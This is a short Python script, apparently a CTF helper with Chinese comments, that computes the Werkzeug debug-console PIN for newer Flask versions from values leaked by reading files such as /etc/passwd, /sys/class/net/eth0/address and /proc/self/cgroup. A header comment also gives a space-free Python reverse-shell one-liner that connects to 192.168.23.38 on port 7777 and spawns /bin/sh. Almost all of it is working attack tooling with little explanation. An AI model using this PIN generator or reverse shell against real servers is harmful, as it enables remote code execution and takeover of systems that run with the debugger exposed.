# sha1算法，适用于高版本flask

# 无空格Python弹shell
# python3$IFS-c$IFS'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.23.38",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
import hashlib
from itertools import chain
probably_public_bits = [
    'ctf'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.10/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    str(int("02:42:ac:02:5f:a2".replace(":",""),16)),#  /sys/class/net/eth0/address 16进制转10进制
    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    "0937b108-f233-41ef-b486-c44f6a83a2be"+"6ee9d72c6e317c504fc3342905173526d04c524ee76a18f9b4fa9ac940da8121"#  /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
